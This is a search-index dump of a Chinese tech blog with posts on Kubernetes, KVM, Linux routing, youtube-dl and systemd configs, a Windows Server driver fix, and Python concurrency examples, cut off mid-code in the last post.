Bloghttp://huangxuan.me/","link":"/hexo-blog/2019/10/09/2019-%E5%B9%B4-10-%E6%9C%88%E6%89%8B%E8%AE%B0/"},{"title":"2020 年 1 月手记","text":"Kuberneteskubernetes dynamic clienttyped client 接收固定类型的对象，只能对固定类型对象进行操作。dynamic client 我们只要告诉它 group，version，kind 信息，传入 unstructured object，便可操作“任意类型”的对象。 https://stackoverflow.com/questions/53341727/how-to-submit-generic-runtime-object-to-kubernetes-api-using-client-go https://soggy.space/namespaced-crds-dynamic-client/ https://www.oreilly.com/library/view/programming-kubernetes/9781492047094/ch04.html node topology managernode topology manager 在绑核时可以感知设备拓扑（例如 NUMA Node）： https://github.com/kubernetes/kubernetes/issues/49964 https://docs.google.com/document/d/1lSwVh2ZfJ2FeLXIeyyiNqN_hKPYpahJiwN5X5cszjOk/edit# https://upcommons.upc.edu/bitstream/handle/2117/114851/Topology-Aware%20GPU%20Scheduling%20for%20Learning%20Workloads.pdf https://github.com/kubernetes/enhancements/blob/master/keps/sig-node/0035-20190130-topology-manager.md sealos一个生产环境可以使用的 Kubernetes 高可用方案 https://github.com/fanux/sealos openebshttps://docs.openebs.io/ https://github.com/openebs/openebs Pod Readiness Gate第三方组件通过该接口，可以主动设置 Pod 的 Ready 状态，从而控制 endpoints 的更新。 https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle/#pod-readiness-gate https://github.com/kubernetes/enhancements/blob/master/keps/sig-network/0007-pod-ready%2B%2B.md https://docs.google.com/document/d/1VFZbc_IqPf_Msd-jul7LKTmGjvQ5qRldYOFV0lGqxf8/edit# client-go informerhttps://blog.csdn.net/weixin_42663840/article/details/81699303 kubernetes gitlab repositoryhttps://gitlab.cncf.ci/kubernetes/kubernetes eBay Search On K8s - Mohnish Kodnani &amp; Yashwanth Vempati, eBayhttps://www.youtube.com/watch?v=chGN44Kqpd8 Networkstcpdump 教程https://danielmiessler.com/study/tcpdump/ socket 编程https://www.geeksforgeeks.org/socket-programming-cc/ tcp server 实现https://www.geeksforgeeks.org/tcp-server-client-implementation-in-c/ udp server 实现https://www.geeksforgeeks.org/udp-server-client-implementation-c/ https://linuxacademy.com/blog/linux/netstat-network-analysis-and-troubleshooting-explained/ Linux资源限制rlimit_nofile的调整细节及内部实现https://wweir.cc/post/%E8%B5%84%E6%BA%90%E9%99%90%E5%88%B6rlimit_nofile%E7%9A%84%E8%B0%83%E6%95%B4%E7%BB%86%E8%8A%82%E5%8F%8A%E5%86%85%E9%83%A8%E5%AE%9E%E7%8E%B0/ 模拟进程 d 状态https://unix.stackexchange.com/questions/134888/simulate-an-unkillable-process-in-d-state cfs throttling issueshttps://www.youtube.com/watch?v=UE7QX98-kO0 https://github.com/kubernetes/kubernetes/issues/67577","link":"/hexo-blog/2020/01/09/2020-%E5%B9%B4-1-%E6%9C%88%E6%89%8B%E8%AE%B0/"},{"title":"2020 年 2 月手记","text":"Kubernetesdeletion timestamp如果 Pod 的 DeletionGracePeriodSeconds 与 TerminationGracePeriodSeconds 同时存在时，哪个生效？ kubelet 代码里 DeletionGracePeriodSeconds 的优先级高。","link":"/hexo-blog/2020/02/16/2020-%E5%B9%B4-2-%E6%9C%88%E6%89%8B%E8%AE%B0/"},{"title":"2020 年 3 月手记","text":"Kubernetesclient-go leader election 源码分析https://zhengyinyong.com/post/kubernetes-pod-leader-election/ https://mathspanda.github.io/2017/05/11/k8s-leader-election/ kubernetes networkshttps://draveness.me/kubernetes-service https://blog.scottlowe.org/2013/09/04/introducing-linux-network-namespaces/ https://www.cyberciti.biz/faq/linux-ip-command-examples-usage-syntax/ kubectl pluginhttps://kubernetes.io/docs/tasks/extend-kubectl/kubectl-plugins/ https://github.com/fatsheep9146/kubectl-pvc KVMcompress qcow2 imageshttps://wiki.liutyi.info/display/DEVOPS/compress+qcow2+images Linuxcgroup page cache accountinghttps://serverfault.com/questions/903432/page-cache-usage-listed-in-cgroups-memory-stat-file https://www.kernel.org/doc/Documentation/cgroup-v1/memory.txt Golanggo 101https://github.com/go101/go101 https://gfw.go101.org/article/101.html Productivealfredhttps://sspai.com/post/55553 https://sspai.com/post/32979 https://sspai.com/post/32457 其他tensorflow 教程https://morvanzhou.github.io/tutorials/machine-learning/tensorflow/ https://www.tensorflow.org/tutorials/quickstart/beginner?hl=zh-cn https://github.com/machinelearningmindset/TensorFlow-Course 分布式锁的实现https://juejin.im/post/5bbb0d8df265da0abd3533a5","link":"/hexo-blog/2020/03/08/2020-%E5%B9%B4-3-%E6%9C%88%E6%89%8B%E8%AE%B0/"},{"title":"解决 “Windows 安装程序无法将 Windows 配置为在此计算机的硬件上运行”","text":"我的 NAS 的配置是 HP Gen8 + Intel 志强 1220L v2，之前用 1T 的机械硬盘作为系统盘，因为感觉日常 IO 速度有些慢，恰好台式电脑淘汰下一个 Samsung 860 EVO SSD，所以决定替换磁盘。而此前一直是 Debian 10 + Windows Server 2008 R2 双系统，Linux 备份还原很简单，dd 命令使用起来非常方便，用 LiveCD chroot 刷新一次 grub 即可，但 Windows 就要重新安装和配置了。 因为 Windows 安装程序会覆盖掉硬盘的主引导记录 (MBR)，所以一般是先安装 Windows，再安装 Linux 用 grub 重写 MBR。 然而，当我认为一切尽在掌握之时，Windows Server 2008 R2 的安装程序在复制完文件重启配置时弹出“Windows 安装程序无法将 Windows 配置为在此计算机的硬件上运行”错误，然后就中断重启了。 之前从来没有遇到过这个问题，于是在网上查了很多帖子，尝试了以下几个方法： 首先尝试了这个方法： 在错误屏幕中, 按 Shift + F10 打开命令提示符 (或在 Windows 搜索栏中键入 cmd, 并从搜索结果菜单中选择 “命令提示符”)。 键入 cd \\ , 然后按 enter 键。 键入 cd x:\\windows\\system32\\oobe ( x 是安装 Windows 的驱动器号, 例如 c:\\windows\\system32\\oobe), 然后按 enter 键。 键入 msoobe , 然后按 enter 键。安装过程现在应该会自动继续。 卸下安装介质, 系统应完成安装并引导至 Windows。 按这种方法操作后虽然安装程序继续进行了，但是重启后蓝屏。 有说分区问题的，我的硬盘是 250G，我用了 MBR 分区表，分了两个主分区，第一个分区是 Linux ext4 bootable，第二个分区是 Windows NTFS。我用 fdisk 重新分区，将分区互换，将 NTFS 分区放在了第一个分区，依然没用。 正在一筹莫展时，发现了这两篇文章： https://www.cnblogs.com/niray/p/3931419.html http://blog.sina.com.cn/s/blog_495113340100ovfe.html 这两篇文章都提到了 Intel RST 驱动，觉得分析的有点道理，可能是新版本的 SSD 造成了安装程序无法识别。 但这个驱动芯片组不同一般不能通用。查了相关文档，我的 Gen8 主板是 Intel C204 芯片组，也就是 Intel 6 Series/C200 系列芯片组，对应的 RST 版本应该是 12.8.0.1016。很遗憾，不管是 Intel 中文还是英文官网都没有找到该版本的驱动程序。 正在要放弃的时候，发现了一根救命稻草，这里分享了一个地址： http://pan.baidu.com/s/1ntLTF65 。赶紧下载下来，将 exe 解压（注意不要直接打开安装），找到 Chipset_Intel_9.3.0.1025\\Intel\\All\\cougahci.cat 和 cougahci.inf，将这两个文件拷出来放到 U 盘或者用 iLO 加载至可移动设备，在 Windows 安装分区选择界面加载驱动程序时加载进去，再安装，问题完美解决，系统成功安装！（但这个驱动版本并不是 12.8.0.1016，只要 AHCI 驱动兼容就可以了。）","link":"/hexo-blog/2020/03/23/%E8%A7%A3%E5%86%B3%E2%80%9CWindows%20%E5%AE%89%E8%A3%85%E7%A8%8B%E5%BA%8F%E6%97%A0%E6%B3%95%E5%B0%86%20Windows%20%E9%85%8D%E7%BD%AE%E4%B8%BA%E5%9C%A8%E6%AD%A4%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E7%A1%AC%E4%BB%B6%E4%B8%8A%E8%BF%90%E8%A1%8C%E2%80%9D/"},{"title":"Linux 路由表简介","text":"Linux 路由表管理主要通过 ip route 命令，早前的发行版可以用 route 或 netstat -r 命令，本质上是一样的，但因为前者功能更强大所以已逐渐取代后者。 下面两张图是笔者在自己的树莓派上分别使用 ip route 和 route -n 命令查看路由的输出结果： ip route 命令： route -n 命令： 一个 IP 包的寻路过程是通过目的 IP 去匹配路由条目，匹配过程是最长路径匹配，也就是说报文优选掩码最长的路由，比如 10.0.0.0/24 和 10.0.0.1/32，会优先匹配后者。路由条目按照目标地址不同可以分为主机路由、网络路由和默认路由，下面我们按照这三种分类举例解释一下每种条目所代表的含义。 主机路由我们首先看第 4 条路由： ip route 输出格式： 110.0.0.1 dev eth0 proto dhcp scope link src 10.0.0.2 metric 1024 route 输出格式： 12Destination Gateway Genmask Flags Metric Ref Use Iface10.0.0.1 0.0.0.0 255.255.255.255 UH 1024 0 0 eth0 10.0.0.1 和 Destination: 10.0.0.1 Genmask: 255.255.255.255 代表目标地址是一个主机，直接端到端发出即可 Flags: UH：U 代表该条目为激活状态，H 代表是一条主机路由 Gateway 0.0.0.0 和 scope link 表示不需要经过网关。如果目标主机不在本机网络内，添加时可以指定网关（这样的话就是 Flags: UGH） proto dhcp 表示这条路由规则通过 DHCP 获得，如果不指定，默认为 proto boot（不显示） src 10.0.0.2 dev eth0以及 Iface eth0 都表示经过哪个网卡（源 IP）发出 metric 表示路由距离，即到达指定网络所需的跳数 Ref 和 Use 分别表示路由项引用次数和被查询次数，可以不用关心 主机路由可以通过以下的命令添加： 12ip route add &lt;ip&gt; dev &lt;device&gt;ip route add &lt;ip&gt; via &lt;gateway&gt; 或者 12route add -host &lt;ip&gt; dev &lt;device&gt;route add -host &lt;ip&gt; gw &lt;gateway&gt; 网络路由我们看第 5 条路由： ip route 输出格式： 110.8.0.0/24 dev tun0 proto kernel scope link src 10.8.0.1 route 输出格式： 12Destination Gateway Genmask Flags Metric Ref Use Iface10.8.0.0 0.0.0.0 255.255.255.0 U 0 0 0 tun0 这条路由代表的意思是所有目标地址是 10.8.0.0/24 网段的包都通过 tun0 这张网卡发出去（其实这张是 OpenV*N 创建的虚拟网卡）。 10.8.0.0/24 和 Destination: 10.8.0.0 Genmask: 255.255.255.0 表示目标地址是一个网段 Gateway 0.0.0.0 代表目标地址在本机所属网络内部，不需要通过网关，因此标记为 Flags: U。如果目标主机不在本机网络内，添加时是可以指定网关的（对应 Flags: UG） dev tun0 和 Iface tun0 表示通过目标网卡发出去，如果没有指定网关（没有设置 via x.x.x.x 或者设置了 Gateway: 0.0.0.0），那么可以根据需求指定为任意网卡 proto kernel 表示该路由条目是通过内核配置的 src 10.8.0.1 表示源地址，也就是 tun0 这张网卡的 IP 地址，使用 ip route 命令时 src 和 dev 指定其一即可，另外一个可以自动识别 再看第 3 条路由，和第 5 条很相似： ip route 输出格式： 110.0.0.0/24 dev eth0 proto dhcp scope link src 10.0.0.2 metric 1002 route 输出格式： 12Destination Gateway Genmask Flags Metric Ref Use Iface10.0.0.0 0.0.0.0 255.255.255.0 U 1002 0 0 eth0 表示目标地址如果属于 10.0.0.0/24 网段，都通过 eth0 这张网卡发出去。 网络路由可以通过以下的命令添加： 12ip route add &lt;net&gt; dev &lt;device&gt;ip route add &lt;net&gt; via &lt;gateway&gt; 或者 12route add -net &lt;ip&gt; netmask &lt;netmask&gt; dev &lt;device&gt;route add -net &lt;ip&gt; netmask &lt;netmask&gt; gw &lt;gateway&gt; 默认路由如果目标地址在主机路由和网络路由中都没有找到，那么就会走默认路由，我们看第 1 条和第 2 条： ip route 输出格式： 12default via 10.0.0.1 dev eth0 proto dhcp src 10.0.0.2 metric 1002default via 10.0.0.1 dev eth0 proto dhcp src 10.0.0.2 metric 1024 route 输出格式： 123Destination Gateway Genmask Flags Metric Ref Use Iface0.0.0.0 10.0.0.1 0.0.0.0 UG 1002 0 0 eth00.0.0.0 10.0.0.1 0.0.0.0 UG 1024 0 0 eth0 default via 10.0.0.1 和 Destination: 0.0.0.0 Genmask 0.0.0.0 Gateway 10.0.0.1 表示这两条都会通过网关（Flags: UG） via 10.0.0.1 表示发向 10.0.0.1 这个网关地址，dev eth0 和 Iface eth0 必须是连接网关的网卡，如果网卡不在这个网段添加时会报错，所以不用担心 IP 和网卡设备不匹配 默认路由可以通过以下的命令添加： 12ip route add default dev &lt;device&gt;ip route add default via &lt;gateway&gt; 或者 12route add default dev &lt;device&gt;route add default gw &lt;gateway&gt; 总结Linux 路由表目标地址可以分为主机路由、网络路由和默认路由，根据掩码最长匹配原则依次匹配，每种路由都可以选择是否经过网关，如果经过网关，网卡设备必须指定为 IP 地址是同一网段的网卡，如果不需要经过网关，可以指定任意的网卡设备。 参考linux 路由表设置 之 route 指令详解 如何管理系统路由表 鳥哥的 Linux 私房菜 – 架設 Router","link":"/hexo-blog/2021/01/16/Linux%20%E8%B7%AF%E7%94%B1%E8%A1%A8%E7%AE%80%E4%BB%8B/"},{"title":"youtube-dl 配置备忘","text":"youtube-dl 下载配置： /etc/youtube-dl.conf 123456789-f bestvideo[ext=mp4]+bestaudio[ext=m4a]/bestvideo+bestaudio--merge-output-format mp4--add-metadata--embed-thumbnail --embed-subs --all-subs --xattrs--yes-playlist--write-info-json--output &quot;%(uploader)s/%(playlist).40s/[%(upload_date)s] %(title).68s [%(id)s].%(ext)s&quot;--output-na-placeholder &quot;&quot;--ignore-errors 创建 systemd 定时任务，每一小时执行一次： /usr/lib/systemd/system/youtube-dl.timer 或 /etc/systemd/system/youtube-dl.timer 123456789[Unit]Description=youtube-dl timer[Timer]OnUnitActiveSec=1hUnit=youtube-dl.service[Install]WantedBy=multi-user.target 创建 systemd 服务： /usr/lib/systemd/system/youtube-dl.service 或 /etc/systemd/system/youtube-dl.service 1234567891011121314[Unit]Description=youtube-dl[Service]WorkingDirectory=/home/whypro/youtube-dlEnvironment=http_proxy=http://127.0.0.1:1080Environment=https_proxy=http://127.0.0.1:1080#ExecStart=/usr/bin/youtube-dl --batch-file=todo.txt --download-archive=archive.txtExecStart=/usr/local/bin/youtube-dl --batch-file=/home/whypro/youtube-dl/todo.txt --download-archive=/home/whypro/youtube-dl/User=whyproGroup=whypro[Install]WantedBy=multi-user.target 参考：Systemd 定时器教程 - 阮一峰的网络日志","link":"/hexo-blog/2021/01/22/youtube-dl%20%E9%85%8D%E7%BD%AE%E5%A4%87%E5%BF%98/"},{"title":"Kubernetes 快速部署方法","text":"安装 Dockerhttps://kubernetes.io/docs/setup/production-environment/container-runtimes/#docker 国内加速替换软件源http://mirrors.ustc.edu.cn/ 123456curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key --keyring /etc/apt/trusted.gpg.d/docker.gpg add -sudo add-apt-repository \\ &quot;deb [arch=amd64] http://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/ \\ $(lsb_release -cs) \\ stable&quot; 安装 kubeadmhttps://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/ 国内加速替换软件源1234curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add -cat &lt;&lt;EOF | sudo tee /etc/apt/sources.list.d/kubernetes.listdeb http://mirrors.ustc.edu.cn/kubernetes/apt/ kubernetes-xenial mainEOF 使用 kubeadm 创建集群https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/create-cluster-kubeadm/ 12345678910111213141516171819202122232425262728293031323334353637apiVersion: kubeadm.k8s.io/v1beta2bootstrapTokens:- groups: - system:bootstrappers:kubeadm:default-node-token token: abcdef.0123456789abcdef ttl: 24h0m0s usages: - signing - authenticationkind: InitConfigurationlocalAPIEndpoint: advertiseAddress: 192.168.122.11 bindPort: 6443nodeRegistration: criSocket: /var/run/dockershim.sock taints: []---apiServer: timeoutForControlPlane: 4m0sapiVersion: kubeadm.k8s.io/v1beta2certificatesDir: /etc/kubernetes/pkiclusterName: kubernetescontrollerManager: {}dns: type: CoreDNSetcd: local: dataDir: /var/lib/etcdimageRepository: registry.aliyuncs.com/google_containerskind: ClusterConfigurationkubernetesVersion: v1.20.0networking: dnsDomain: cluster.local serviceSubnet: 10.96.0.0/12 podSubnet: 172.16.0.0/16scheduler: {} 安装网络插件 (calico)https://docs.projectcalico.org/getting-started/kubernetes/self-managed-onprem/onpremises#install-calico-with-kubernetes-api-datastore-50-nodes-or-less 安装 Helmhttps://helm.sh/docs/intro/install/ 安装 Ingress Controller (ingress-nginx)https://kubernetes.github.io/ingress-nginx/deploy/#using-helm 1helm install ingress-nginx ingress-nginx/ingress-nginx -n ingress-nginx -f ingress-nginx-values.yaml 安装存储插件 (local-volume-provisioner)1helm install local-volume-provisioner . -f values_local.yaml -n kube-system 12mkdir /mnt/fast-disks/pv{0..3}for i in {0..3}; do mount --bind /mnt/fast-disks/pv$i /mnt/fast-disks/pv$i; done /etc/fstab 1234/mnt/fast-disks/pv0 /mnt/fast-disks/pv0 none defaults,bind 0 0/mnt/fast-disks/pv1 /mnt/fast-disks/pv1 none defaults,bind 0 0/mnt/fast-disks/pv2 /mnt/fast-disks/pv2 none defaults,bind 0 0/mnt/fast-disks/pv3 /mnt/fast-disks/pv3 none defaults,bind 0 0","link":"/hexo-blog/2021/02/07/Kubernetes%20%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2%E6%96%B9%E6%B3%95/"},{"title":"基于 KVM 的开发环境搭建","text":"创建虚拟机首先下载 ubuntu cloud image 使用 virsh 参考这个教程创建虚拟机： Using Cloud Images With KVM [2021-02-07].html 固定 IPKVM libvirt assign static guest IP addresses using DHCP on the virtual machine - nixCraft [2021-02-07].html SSH如果 sshd 启动失败，报错 sshd: no hostkeys available -- exiting，需要执行： 1ssh-keygen -A sshd_ no hostkeys available – exiting [2021-02-07].html 克隆虚拟机How to clone existing KVM virtual machine images on Linux - nixCraft [2021-02-07].html virsh shutdown 无法关机kvm虚拟化解决virsh shutdown关不掉虚拟机的问题_wcs_sdu的博客-CSDN博客 [2021-02-27].html https://www.ilanni.com/?p=6225 1234&lt;features&gt; &lt;acpi/&gt; &lt;apic/&gt;&lt;/features&gt; 123&lt;on_poweroff&gt;destroy&lt;/on_poweroff&gt;&lt;on_reboot&gt;restart&lt;/on_reboot&gt;&lt;on_crash&gt;destroy&lt;/on_crash&gt; 1apt install acpid VM 磁盘扩容How To extend_increase KVM Virtual Machine (VM) disk size _ ComputingForGeeks [2021-03-06].html How To resize an ext2_3_4 and XFS root partition without LVM _ ComputingForGeeks [2021-03-06].html","link":"/hexo-blog/2021/02/07/%E5%9F%BA%E4%BA%8E%20KVM%20%E7%9A%84%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"title":"在本地运行 Kubernetes e2e 测试","text":"安装 kubetesthttps://github.com/kubernetes/test-infra/tree/master/kubetest#installation 1go install k8s.io/test-infra/kubetest 或者 1GO111MODULE=on go install ./kubetest 构建二进制1kubetest --build 启动本地集群1./hack/local-up-cluster.sh 如果没有安装 etcd 需要先安装 1./hack/install-etcd.sh 使用 kubectl 访问 12345cluster/kubectl.sh config set-cluster local --server=https://localhost:6443 --certificate-authority=/var/run/kubernetes/server-ca.crtcluster/kubectl.sh config set-credentials myself --client-key=/var/run/kubernetes/client-admin.key --client-certificate=/var/run/kubernetes/client-admin.crtcluster/kubectl.sh config set-context local --cluster=local --user=myselfcluster/kubectl.sh config use-context localcluster/kubectl.sh 启动 e2e test1kubetest --provider=local --test --test_args=&quot;--ginkgo.focus=XXX&quot; 快速编译 e2e test1make WHAT=test/e2e/e2e.test 参考https://github.com/kubernetes/community/blob/master/contributors/devel/sig-testing/e2e-tests.md","link":"/hexo-blog/2021/03/06/%E5%9C%A8%E6%9C%AC%E5%9C%B0%E8%BF%90%E8%A1%8C%20Kubernetes%20e2e%20%E6%B5%8B%E8%AF%95/"},{"title":"使用 Python 进行并发编程","text":"让计算机程序并发的运行是一个经常被讨论的话题，今天我想讨论一下Python下的各种并发方式。 并发方式线程（Thread） 多线程几乎是每一个程序猿在使用每一种语言时都会首先想到用于解决并发的工具（JS程序员请回避），使用多线程可以有效的利用CPU资源（Python例外）。然而多线程所带来的程序的复杂度也不可避免，尤其是对竞争资源的同步问题。 然而在python中由于使用了全局解释锁（GIL）的原因，代码并不能同时在多核上并发的运行，也就是说，Python的多线程不能并发，很多人会发现使用多线程来改进自己的Python代码后，程序的运行效率却下降了，这是多么蛋疼的一件事呀！如果想了解更多细节，推荐阅读这篇文章。实际上使用多线程的编程模型是很困难的，程序员很容易犯错，这并不是程序员的错误，因为并行思维是反人类的，我们大多数人的思维是串行（精神分裂不讨论），而且冯诺依曼设计的计算机架构也是以顺序执行为基础的。所以如果你总是不能把你的多线程程序搞定，恭喜你，你是个思维正常的程序猿：） Python提供两组线程的接口，一组是thread模块，提供基础的，低等级（Low Level）接口，使用Function作为线程的运行体。还有一组是threading模块，提供更容易使用的基于对象的接口（类似于Java），可以继承Thread对象来实现线程，还提供了其它一些线程相关的对象，例如Timer，Lock 使用thread模块的例子 12345import threaddef worker(): &quot;&quot;&quot;thread worker function&quot;&quot;&quot; print 'Worker'thread.start_new_thread(worker) 使用threading模块的例子 123456import threadingdef worker(): &quot;&quot;&quot;thread worker function&quot;&quot;&quot; print 'Worker't = threading.Thread(target=worker)t.start() 或者Java Style 12345678910import threadingclass worker(threading.Thread): def __init__(self): pass def run(): &quot;&quot;&quot;thread worker function&quot;&quot;&quot; print 'Worker't = worker()t.start() 进程（Process）由于前文提到的全局解释锁的问题，Python下比较好的并行方式是使用多进程，这样可以非常有效的使用CPU资源，并实现真正意义上的并发。当然，进程的开销比线程要大，也就是说如果你要创建数量惊人的并发进程的话，需要考虑一下你的机器是不是有一颗强大的心。 Python的mutliprocess模块和threading具有类似的接口。 12345678from multiprocessing import Processdef worker(): &quot;&quot;&quot;thread worker function&quot;&quot;&quot; print 'Worker'p = Process(target=worker)p.start()p.join() 由于线程共享相同的地址空间和内存，所以线程之间的通信是非常容易的，然而进程之间的通信就要复杂一些了。常见的进程间通信有，管道，消息队列，Socket接口（TCP/IP）等等。 Python的mutliprocess模块提供了封装好的管道和队列，可以方便的在进程间传递消息。 Python进程间的同步使用锁，这一点喝线程是一样的。 另外，Python还提供了进程池Pool对象，可以方便的管理和控制线程。 远程分布式主机（Distributed Node）随着大数据时代的到临，摩尔定理在单机上似乎已经失去了效果，数据的计算和处理需要分布式的计算机网络来运行，程序并行的运行在多个主机节点上，已经是现在的软件架构所必需考虑的问题。 远程主机间的进程间通信有几种常见的方式 TCP／IP TCP／IP是所有远程通信的基础，然而API比较低级别，使用起来比较繁琐，所以一般不会考虑 远程方法调用 Remote Function Call RPC 是早期的远程进程间通信的手段。Python下有一个开源的实现 RPyC 远程对象 Remote Object 远程对象是更高级别的封装，程序可以想操作本地对象一样去操作一个远程对象在本地的代理。远程对象最广为使用的规范CORBA，CORBA最大的好处是可以在不同语言和平台中进行通信。当让不用的语言和平台还有一些各自的远程对象实现，例如Java的RMI ，MS的DCOM Python的开源实现，有许多对远程对象的支持 Dopy Fnorb（CORBA） ICE omniORB（CORBA） Pyro YAMI 消息队列 Message Queue 比起RPC或者远程对象，消息是一种更为灵活的通信手段，常见的支持Python接口的消息机制有 RabbitMQ ZeroMQ Kafka AWS SQS＋BOTO 在远程主机上执行并发和本地的多进程并没有非常大的差异，都需要解决进程间通信的问题。当然对远程进程的管理和协调比起本地要复杂。 Python下有许多开源的框架来支持分布式的并发，提供有效的管理手段包括： Celery Celery是一个非常成熟的Python分布式框架，可以在分布式的系统中，异步的执行任务，并提供有效的管理和调度功能。参考这里 SCOOP SCOOP（Scalable COncurrent Operations in Python）提供简单易用的分布式调用接口，使用Future接口来进行并发。 Dispy 相比起Celery和SCOOP，Dispy提供更为轻量级的分布式并行服务 PP PP（Parallel Python）是另外一个轻量级的Python并行服务， 参考这里 Asyncoro Asyncoro是另一个利用Generator实现分布式并发的Python框架， 当然还有许多其它的系统，我没有一一列出 另外，许多的分布式系统多提供了对Python接口的支持，例如 Spark 伪线程（Pseudo－Thread）还有一种并发手段并不常见，我们可以称之为伪线程，就是看上去像是线程，使用的接口类似线程接口，但是实际使用非线程的方式，对应的线程开销也不存的。 greenlet greenlet提供轻量级的coroutines来支持进程内的并发。 greenlet是Stackless的一个副产品，使用tasklet来支持一中被称之为微线程（mirco－thread）的技术，这里是一个使用greenlet的伪线程的例子 123456789101112131415from greenlet import greenletdef test1(): print 12 gr2.switch() print 34def test2(): print 56 gr1.switch() print 78gr1 = greenlet(test1)gr2 = greenlet(test2)gr1.switch() 运行以上程序得到如下结果： 123125634 伪线程gr1 switch会打印12，然后调用gr2 switch得到56，然后switch回到gr1，打印34，然后伪线程gr1结束，程序退出，所以78永远不会被打印。通过这个例子我们可以看出，使用伪线程，我们可以有效的控制程序的执行流程，但是伪线程并不存在真正意义上的并发。 eventlet，gevent和concurence都是基于greenlet提供并发的。 eventlet eventlet是一个提供网络调用并发的Python库，使用者可以以非阻塞的方式来调用阻塞的IO操作。 123456789101112import eventletfrom eventlet.green import urllib2urls = ['http://www.google.com', 'http://www.example.com', 'http://www.python.org']def fetch(url): return urllib2.urlopen(url).read()pool = eventlet.GreenPool()for body in pool.imap(fetch, urls): print(&quot;got body&quot;, len(body)) 执行结果如下 123('got body', 17629)('got body', 1270)('got body', 46949) eventlet为了支持generator的操作对urllib2做了修改，接口和urllib2是一致的。这里的GreenPool和Python的Pool接口一致。 gevent gevent和eventlet类似，关于它们的差异大家可以参考这篇文章 1234567import geventfrom gevent import socketurls = ['www.google.com', 'www.example.com', 'www.python.org']jobs = [gevent.spawn(socket.gethostbyname, url) for url in urls]gevent.joinall(jobs, timeout=2)print [job.value for job in jobs] 执行结果如下： 1['206.169.145.226', '93.184.216.34', '23.235.39.223'] concurence concurence是另外一个利用greenlet提供网络并发的开源库，我没有用过，大家可以自己尝试一下。 实战运用通常需要用到并发的场合有两种，一种是计算密集型，也就是说你的程序需要大量的CPU资源;另一种是IO密集型，程序可能有大量的读写操作，包括读写文件，收发网络请求等等。 计算密集型对应计算密集型的应用，我们选用著名的蒙特卡洛算法来计算PI值。基本原理如下 蒙特卡洛算法利用统计学原理来模拟计算圆周率，在一个正方形中，一个随机的点落在1/4圆的区域（红色点）的概率与其面积成正比。也就该概率 p ＝ Pi ＊ R＊R ／4 ： R＊ R ， 其中R是正方形的边长，圆的半径。也就是说该概率是圆周率的1/4, 利用这个结论，只要我们模拟出点落在四分之一圆上的概率就可以知道圆周率了，为了得到这个概率，我们可以通过大量的实验，也就是生成大量的点，看看这个点在哪个区域，然后统计出结果。 基本算法如下： 12345from math import hypotfrom random import randomdef test(tries): return sum(hypot(random(), random()) &lt; 1 for _ in range(tries)) 这里test方法做了n（tries）次试验，返回落在四分之一圆中的点的个数。判断方法是检查该点到圆心的距离，如果小于R则是在圆上。 通过大量的并发，我们可以快速的运行多次试验，试验的次数越多，结果越接近真实的圆周率。 这里给出不同并发方法的程序代码 非并发 我们先在单线程，但进程运行，看看性能如何 123456789101112131415161718from math import hypotfrom random import randomimport eventletimport timedef test(tries): return sum(hypot(random(), random()) &lt; 1 for _ in range(tries))def calcPi(nbFutures, tries): ts = time.time() result = map(test, [tries] * nbFutures) ret = 4. * sum(result) / float(nbFutures * tries) span = time.time() - ts print &quot;time spend &quot;, span return retprint calcPi(3000,4000) 多线程 thread 为了使用线程池，我们用multiprocessing的dummy包，它是对多线程的一个封装。注意这里代码虽然一个字的没有提到线程，但它千真万确是多线程。 通过测试我们开（jing）心（ya）的发现，果然不出所料，当线程池为1是，它的运行结果和没有并发时一样，当我们把线程池数字设置为5时，耗时几乎是没有并发的2倍，我的测试数据从5秒到9秒。所以对于计算密集型的任务，还是放弃多线程吧。 123456789101112131415161718192021from multiprocessing.dummy import Poolfrom math import hypotfrom random import randomimport timedef test(tries): return sum(hypot(random(), random()) &lt; 1 for _ in range(tries))def calcPi(nbFutures, tries): ts = time.time() p = Pool(1) result = p.map(test, [tries] * nbFutures) ret = 4. * sum(result) / float(nbFutures * tries) span = time.time() - ts print &quot;time spend &quot;, span return retif __name__ == '__main__': p = Pool() print(&quot;pi = {}&quot;.format(calcPi(3000, 4000))) 多进程 multiprocess 理论上对于计算密集型的任务，使用多进程并发比较合适，在以下的例子中，进程池的规模设置为5，修改进程池的大小可以看到对结果的影响，当进程池设置为1时，和多线程的结果所需的时间类似，因为这时候并不存在并发；当设置为2时，响应时间有了明显的改进，是之前没有并发的一半；然而继续扩大进程池对性能影响并不大，甚至有所下降，也许我的Apple Air的CPU只有两个核？ 当心，如果你设置一个非常大的进程池，你会遇到 Resource temporarily unavailable的错误，系统并不能支持创建太多的进程，毕竟资源是有限的。 1234567891011121314151617181920from multiprocessing import Poolfrom math import hypotfrom random import randomimport timedef test(tries): return sum(hypot(random(), random()) &lt; 1 for _ in range(tries))def calcPi(nbFutures, tries): ts = time.time() p = Pool(5) result = p.map(test, [tries] * nbFutures) ret = 4. * sum(result) / float(nbFutures * tries) span = time.time() - ts print &quot;time spend &quot;, span return retif __name__ == '__main__': print(&quot;pi = {}&quot;.format(calcPi(3000, 4000))) gevent （伪线程） 不论是gevent还是eventlet，因为不存在实际的并发，响应时间和没有并发区别不大，这个和测试结果一致。 123456789101112131415161718import geventfrom math import hypotfrom random import randomimport timedef test(tries): return sum(hypot(random(), random()) &lt; 1 for _ in range(tries))def calcPi(nbFutures, tries): ts = time.time() jobs = [gevent.spawn(test, t) for t in [tries] * nbFutures] gevent.joinall(jobs, timeout=2) ret = 4. * sum([job.value for job in jobs]) / float(nbFutures * tries) span = time.time() - ts print &quot;time spend &quot;, span return retprint calcPi(3000,4000) eventlet （伪线程） 代码如下 12345678910111213141516171819from math import hypotfrom random import randomimport eventletimport timedef test(tries): return sum(hypot(random(), random()) &lt; 1 for _ in range(tries))def calcPi(nbFutures, tries): ts = time.time() pool = eventlet.GreenPool() result = pool.imap(test, [tries] * nbFutures) ret = 4. * sum(result) / float(nbFutures * tries) span = time.time() - ts print &quot;time spend &quot;, span return 